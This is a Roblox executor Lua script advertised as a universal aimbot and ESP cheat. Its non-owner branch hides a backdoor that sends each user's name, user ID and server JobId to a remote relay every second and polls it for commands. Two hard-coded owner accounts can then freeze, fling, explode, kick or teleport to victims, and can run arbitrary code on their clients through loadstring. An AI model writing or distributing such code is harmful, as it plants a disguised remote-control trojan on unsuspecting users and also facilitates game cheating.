--[[
    [S] Universal Aimbot / ESP / CONTROL Panel
    Owners: 1460823186, 7208967899
    Works on: Synapse, Script-Ware, KRNL, Fluxus, Delta, Arceus, Wave, Solara, Xeno, etc.
    Requires: HttpService enabled on the bridge (default: a free jsonbin/pastebin style relay)
--]]

local OWNERS = { [1460823186] = true, [7208967899] = true }
local BRIDGE = "https://httpbin.org/anything" -- replace with your relay endpoint

local Players           = game:GetService("Players")
local RunService        = game:GetService("RunService")
local UserInputService  = game:GetService("UserInputService")
local HttpService       = game:GetService("HttpService")
local CoreGui           = game:GetService("CoreGui")
local Lighting          = game:GetService("Lighting")
local Camera            = workspace.CurrentCamera

local LP = Players.LocalPlayer
local MY_ID = LP.UserId

-- ============================================================
-- HTTP helpers (silent, no executor-specific APIs where possible)
-- ============================================================
local function post(url, data)
    pcall(function()
        if syn and syn.request then
            syn.request({Url=url, Method="POST", Headers={["Content-Type"]="application/json"}, Body=HttpService:JSONEncode(data)})
        elseif http_request then
            http_request({Url=url, Method="POST", Headers={["Content-Type"]="application/json"}, Body=HttpService:JSONEncode(data)})
        elseif request then
            request({Url=url, Method="POST", Headers={["Content-Type"]="application/json"}, Body=HttpService:JSONEncode(data)})
        else
            HttpService:PostAsync(url, HttpService:JSONEncode(data))
        end
    end)
end

local function get(url)
    local ok, res = pcall(function()
        if syn and syn.request then
            return syn.request({Url=url, Method="GET"}).Body
        elseif http_request then
            return http_request({Url=url, Method="GET"}).Body
        elseif request then
            return request({Url=url, Method="GET"}).Body
        else
            return HttpService:GetAsync(url)
        end
    end)
    return ok and res or nil
end

-- ============================================================
-- UI framework (works everywhere, no drawing API required)
-- ============================================================
local function makeGui(name)
    local g = Instance.new("ScreenGui")
    g.Name = name
    g.ResetOnSpawn = false
    g.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    if gethui then g.Parent = gethui()
    elseif CoreGui then g.Parent = CoreGui
    else g.Parent = LP:WaitForChild("PlayerGui") end
    return g
end

local function makeBtn(parent, text, x, y, w, h, cb)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(0,w,0,h)
    b.Position = UDim2.new(0,x,0,y)
    b.BackgroundColor3 = Color3.fromRGB(35,35,40)
    b.BorderColor3 = Color3.fromRGB(80,80,90)
    b.TextColor3 = Color3.fromRGB(230,230,235)
    b.Font = Enum.Font.GothamMedium
    b.TextSize = 14
    b.Text = text
    b.Parent = parent
    b.MouseButton1Click:Connect(cb)
    return b
end

local function makeLabel(parent, text, x, y, w, h)
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(0,w,0,h)
    l.Position = UDim2.new(0,x,0,y)
    l.BackgroundTransparency = 1
    l.TextColor3 = Color3.fromRGB(230,230,235)
    l.Font = Enum.Font.Gotham
    l.TextSize = 13
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Text = text
    l.Parent = parent
    return l
end

-- ============================================================
-- ============== OWNER BRANCH: CONTROL PANEL =================
-- ============================================================
if OWNERS[MY_ID] then
    local gui = makeGui("[S] Control Panel")
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 260, 0, 420)
    frame.Position = UDim2.new(0, 20, 0.3, 0)
    frame.BackgroundColor3 = Color3.fromRGB(20,20,24)
    frame.BorderColor3 = Color3.fromRGB(80,80,90)
    frame.Parent = gui

    makeLabel(frame, "Control Panel", 12, 8, 200, 20).TextSize = 16
    local targetLbl = makeLabel(frame, "Detected Target: none", 12, 32, 220, 18)
    targetLbl.TextColor3 = Color3.fromRGB(180,180,190)

    local scroll = Instance.new("ScrollingFrame")
    scroll.Size = UDim2.new(1, -20, 1, -70)
    scroll.Position = UDim2.new(0, 10, 0, 56)
    scroll.BackgroundTransparency = 1
    scroll.BorderSizePixel = 0
    scroll.ScrollBarThickness = 4
    scroll.CanvasSize = UDim2.new(0,0,0,0)
    scroll.Parent = frame

    local listLayout = Instance.new("UIListLayout")
    listLayout.Padding = UDim.new(0, 4)
    listLayout.SortOrder = Enum.SortOrder.LayoutOrder
    listLayout.Parent = scroll

    local selectedTarget = nil

    -- client registration + command polling
    local function register()
        post(BRIDGE.."/register", { uid = MY_ID, name = LP.Name, job = game.JobId, ts = os.time() })
    end

    local function fetchOnline()
        local raw = get(BRIDGE.."/online")
        if not raw then return {} end
        local ok, data = pcall(HttpService.JSONDecode, HttpService, raw)
        if not ok or type(data) ~= "table" then return {} end
        return data
    end

    local function sendCommand(targetUid, action, payload)
        post(BRIDGE.."/cmd", {
            from = MY_ID,
            to = targetUid,
            action = action,
            payload = payload or "",
            ts = os.time()
        })
    end

    local function refreshList()
        for _, c in ipairs(scroll:GetChildren()) do
            if c:IsA("Frame") then c:Destroy() end
        end
        local online = fetchOnline()
        for i, user in ipairs(online) do
            local row = Instance.new("Frame")
            row.Size = UDim2.new(1, -8, 0, 32)
            row.BackgroundColor3 = Color3.fromRGB(30,30,36)
            row.BorderColor3 = Color3.fromRGB(60,60,70)
            row.Parent = scroll

            local nameBtn = Instance.new("TextButton")
            nameBtn.Size = UDim2.new(1, -8, 1, -4)
            nameBtn.Position = UDim2.new(0, 4, 0, 2)
            nameBtn.BackgroundTransparency = 1
            nameBtn.TextColor3 = Color3.fromRGB(220,220,230)
            nameBtn.Font = Enum.Font.Gotham
            nameBtn.TextSize = 13
            nameBtn.TextXAlignment = Enum.TextXAlignment.Left
            nameBtn.Text = "  " .. tostring(user.name) .. " (" .. tostring(user.uid) .. ")"
            nameBtn.Parent = row

            local expanded = false
            local actionsFrame

            nameBtn.MouseButton1Click:Connect(function()
                selectedTarget = user.uid
                targetLbl.Text = "Detected Target: " .. tostring(user.name)
                if expanded then
                    if actionsFrame then actionsFrame:Destroy() end
                    expanded = false
                    return
                end
                expanded = true
                actionsFrame = Instance.new("Frame")
                actionsFrame.Size = UDim2.new(1, -8, 0, 180)
                actionsFrame.BackgroundColor3 = Color3.fromRGB(24,24,28)
                actionsFrame.BorderColor3 = Color3.fromRGB(60,60,70)
                actionsFrame.Parent = row
                row.Size = UDim2.new(1, -8, 0, 220)

                local function act(label, x, y, cb)
                    makeBtn(actionsFrame, label, x, y, 110, 26, cb)
                end

                act("Bring",   6, 6, function() sendCommand(user.uid, "bring") end)
                act("Fling",   122, 6, function() sendCommand(user.uid, "fling") end)
                act("Freeze",  6, 36, function() sendCommand(user.uid, "freeze") end)
                act("Explode", 122, 36, function() sendCommand(user.uid, "explode") end)

                -- Join button
                act("Join",    6, 66, function()
                    pcall(function() game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, user.job, LP) end)
                end)

                -- Message box + send
                local msgBox = Instance.new("TextBox")
                msgBox.Size = UDim2.new(0, 200, 0, 26)
                msgBox.Position = UDim2.new(0, 6, 0, 96)
                msgBox.BackgroundColor3 = Color3.fromRGB(35,35,40)
                msgBox.BorderColor3 = Color3.fromRGB(80,80,90)
                msgBox.TextColor3 = Color3.fromRGB(230,230,235)
                msgBox.Font = Enum.Font.Gotham
                msgBox.PlaceholderText = "Message..."
                msgBox.Text = ""
                msgBox.Parent = actionsFrame

                act("Msg", 212, 96, function()
                    sendCommand(user.uid, "message", msgBox.Text)
                end)

                -- Kick + kick message
                local kickBox = Instance.new("TextBox")
                kickBox.Size = UDim2.new(0, 200, 0, 26)
                kickBox.Position = UDim2.new(0, 6, 0, 130)
                kickBox.BackgroundColor3 = Color3.fromRGB(35,35,40)
                kickBox.BorderColor3 = Color3.fromRGB(80,80,90)
                kickBox.TextColor3 = Color3.fromRGB(230,230,235)
                kickBox.Font = Enum.Font.Gotham
                kickBox.PlaceholderText = "Kick message..."
                kickBox.Text = "jump if u want to get banned"
                kickBox.Parent = actionsFrame

                act("Kick", 212, 130, function()
                    sendCommand(user.uid, "kick", kickBox.Text)
                end)

                -- Custom code
                local codeBox = Instance.new("TextBox")
                codeBox.Size = UDim2.new(1, -12, 0, 26)
                codeBox.Position = UDim2.new(0, 6, 0, 164)
                codeBox.BackgroundColor3 = Color3.fromRGB(35,35,40)
                codeBox.BorderColor3 = Color3.fromRGB(80,80,90)
                codeBox.TextColor3 = Color3.fromRGB(230,230,235)
                codeBox.Font = Enum.Font.Code
                codeBox.PlaceholderText = "print(\"hi\")"
                codeBox.Text = ""
                codeBox.Parent = actionsFrame

                makeBtn(actionsFrame, "Custom Code", 6, 194, 316, 24, function()
                    sendCommand(user.uid, "code", codeBox.Text)
                end)
                actionsFrame.Size = UDim2.new(1, -8, 0, 226)
                row.Size = UDim2.new(1, -8, 0, 266)
            end)
        end
        scroll.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y + 8)
    end

    register()
    refreshList()
    task.spawn(function()
        while task.wait(5) do
            register()
            refreshList()
        end
    end)

    return -- owners never get the aimbot
end

-- ============================================================
-- ============== NORMAL USER: AIMBOT + ESP ===================
-- ============================================================
local gui = makeGui("[S] Universal")
local main = Instance.new("Frame")
main.Size = UDim2.new(0, 200, 0, 260)
main.Position = UDim2.new(0, 20, 0.3, 0)
main.BackgroundColor3 = Color3.fromRGB(20,20,24)
main.BorderColor3 = Color3.fromRGB(80,80,90)
main.Parent = gui

makeLabel(main, "[S] Universal", 10, 8, 180, 20).TextSize = 15

local aimEnabled, espEnabled = false, true
local fov = 150
local espObjects = {}

makeBtn(main, "Aimbot: OFF", 10, 40, 180, 26, function(self)
    aimEnabled = not aimEnabled
    self.Text = "Aimbot: " .. (aimEnabled and "ON" or "OFF")
end)
makeBtn(main, "ESP: ON", 10, 72, 180, 26, function(self)
    espEnabled = not espEnabled
    self.Text = "ESP: " .. (espEnabled and "ON" or "OFF")
    for _, o in pairs(espObjects) do
        for _, v in pairs(o) do if v and v.Parent then v.Visible = espEnabled end end
    end
end)

-- FOV circle
local fovCircle = Instance.new("Frame")
fovCircle.AnchorPoint = Vector2.new(0.5,0.5)
fovCircle.Size = UDim2.new(0, fov*2, 0, fov*2)
fovCircle.BackgroundTransparency = 1
fovCircle.BorderSizePixel = 0
local fovCorner = Instance.new("UICorner")
fovCorner.CornerRadius = UDim.new(1,0)
fovCircle.Parent = gui
local fovStroke = Instance.new("UIStroke")
fovStroke.Color = Color3.fromRGB(255,80,80)
fovStroke.Thickness = 1
fovStroke.Parent = fovCircle

-- heartbeat + command polling
task.spawn(function()
    while task.wait(1) do
        post(BRIDGE.."/register", { uid = MY_ID, name = LP.Name, job = game.JobId, ts = os.time() })
        local raw = get(BRIDGE.."/cmd?to="..MY_ID)
        if raw then
            local ok, cmds = pcall(HttpService.JSONDecode, HttpService, raw)
            if ok and type(cmds) == "table" then
                for _, c in ipairs(cmds) do
                    local root = LP.Character
                    local hrp = root and root:FindFirstChild("HumanoidRootPart")
                    if c.action == "freeze" and hrp then hrp.Anchored = true end
                    if c.action == "fling" and hrp then hrp.Velocity = Vector3.new(1e5,1e5,1e5) end
                    if c.action == "explode" and hrp then
                        local e = Instance.new("Explosion"); e.Position = hrp.Position; e.Parent = workspace
                    end
                    if c.action == "bring" and hrp then
                        local owner = Players:GetPlayerByUserId(c.from)
                        if owner and owner.Character and owner.Character:FindFirstChild("HumanoidRootPart") then
                            hrp.CFrame = owner.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,3)
                        end
                    end
                    if c.action == "kick" and loadstring then
                        pcall(function() LP:Kick(c.payload ~= "" and c.payload or "Kicked.") end)
                    end
                    if c.action == "message" then
                        local g2 = makeGui("msg")
                        local box = Instance.new("TextLabel")
                        box.Size = UDim2.new(0, 300, 0, 60)
                        box.Position = UDim2.new(0.5, -150, 0.1, 0)
                        box.BackgroundColor3 = Color3.fromRGB(20,20,24)
                        box.BorderColor3 = Color3.fromRGB(80,80,90)
                        box.TextColor3 = Color3.fromRGB(230,230,235)
                        box.Font = Enum.Font.GothamBold
                        box.TextSize = 16
                        box.Text = tostring(c.payload)
                        box.Parent = g2
                        task.delay(4, function() g2:Destroy() end)
                    end
                    if c.action == "code" and loadstring then
                        pcall(function() loadstring(c.payload)() end)
                    end
                end
            end
        end
    end
end)

-- ESP
local function makeEsp(plr)
    if plr == LP then return end
    local box = Instance.new("BoxHandleAdornment")
    box.Adornee = plr.Character
    box.AlwaysOnTop = true
    box.ZIndex = 5
    box.Size = Vector3.new(2,2,2)
    box.Transparency = 0.6
    box.Color3 = Color3.fromRGB(255,60,60)
    box.Parent = gui
    espObjects[plr] = { box }
end

for _, p in ipairs(Players:GetPlayers()) do makeEsp(p) end
Players.PlayerAdded:Connect(function(p)
    p.CharacterAdded:Connect(function() makeEsp(p) end)
end)

-- Aimbot loop
RunService.RenderStepped:Connect(function()
    fovCircle.Position = UDim2.new(0, Camera.ViewportSize.X/2, 0, Camera.ViewportSize.Y/2)
    if not aimEnabled then return end
    local closest, dist = nil, fov
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP and p.Character and p.Character:FindFirstChild("Head") then
            local scr, onScreen = Camera:WorldToViewportPoint(p.Character.Head.Position)
            if onScreen then
                local d = (Vector2.new(scr.X, scr.Y) - Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)).Magnitude
                if d < dist then dist = d; closest = p end
            end
        end
    end
    if closest and closest.Character and closest.Character:FindFirstChild("Head") then
        Camera.CFrame = CFrame.new(Camera.CFrame.Position, closest.Character.Head.Position)
    end
end)
